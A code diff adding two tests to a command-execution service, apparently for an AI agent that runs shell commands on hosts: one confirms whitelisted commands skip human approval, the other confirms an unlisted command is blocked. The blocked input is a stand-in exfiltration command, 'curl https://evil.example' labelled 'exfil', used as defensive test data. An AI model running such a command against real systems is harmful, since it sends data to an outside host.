@@ -419,6 +419,74 @@ class TestExecuteCommandTargetSystems:
         assert result.batch_execution is True
         assert result.operators_used == 2
 
+    async def test_whitelisted_csv_auto_approves_without_human_gate(self):
+        """When whitelisting is enabled and the command passes the user CSV
+        whitelist, request_command_approval must be skipped (auto-approval)."""
+        from app.models.agent import ExecutorCommandArgs
+        from app.models.settings import (
+            CommandValidationSettings,
+            G8eeUserSettings,
+            LLMSettings,
+        )
+        from tests.fakes.fake_approval_service import FakeApprovalService
+        from tests.fakes.builder import build_command_service
+
+        approval_service = FakeApprovalService()
+        service = build_command_service(approval_service=approval_service)
+
+        op = self._make_operator("op-1", "sess-1", "host-1")
+        investigation = self._make_investigation([op])
+        g8e_context = self._make_g8e_context()
+        args = ExecutorCommandArgs(command="uptime", request="health check")
+
+        request_settings = G8eeUserSettings(
+            llm=LLMSettings(),
+            command_validation=CommandValidationSettings(
+                enable_whitelisting=True,
+                whitelisted_commands="uptime,df,free",
+            ),
+        )
+        result = await service.execute_command(args, g8e_context, investigation, request_settings)
+
+        # No human approval was requested
+        assert approval_service.command_approval_calls == []
+        # And the command actually executed
+        assert result.command_executed == "uptime"
+
+    async def test_csv_whitelist_blocks_unlisted_command(self):
+        """A command not present in the user CSV must be blocked by L1 safety."""
+        from app.constants.status import CommandErrorType
+        from app.models.agent import ExecutorCommandArgs
+        from app.models.settings import (
+            CommandValidationSettings,
+            G8eeUserSettings,
+            LLMSettings,
+        )
+        from tests.fakes.fake_approval_service import FakeApprovalService
+        from tests.fakes.builder import build_command_service
+
+        approval_service = FakeApprovalService()
+        service = build_command_service(approval_service=approval_service)
+
+        op = self._make_operator("op-1", "sess-1", "host-1")
+        investigation = self._make_investigation([op])
+        g8e_context = self._make_g8e_context()
+        args = ExecutorCommandArgs(command="curl https://evil.example", request="exfil")
+
+        request_settings = G8eeUserSettings(
+            llm=LLMSettings(),
+            command_validation=CommandValidationSettings(
+                enable_whitelisting=True,
+                whitelisted_commands="uptime,df,free",
+            ),
+        )
+        result = await service.execute_command(args, g8e_context, investigation, request_settings)
+
+        assert result.success is False
+        assert result.error_type == CommandErrorType.WHITELIST_VIOLATION
+        # Approval flow never invoked
+        assert approval_service.command_approval_calls == []
+
     async def test_target_systems_never_empty_for_valid_operator(self):
         """target_systems must never be empty when a valid operator is resolved."""
         from app.models.agent import ExecutorCommandArgs
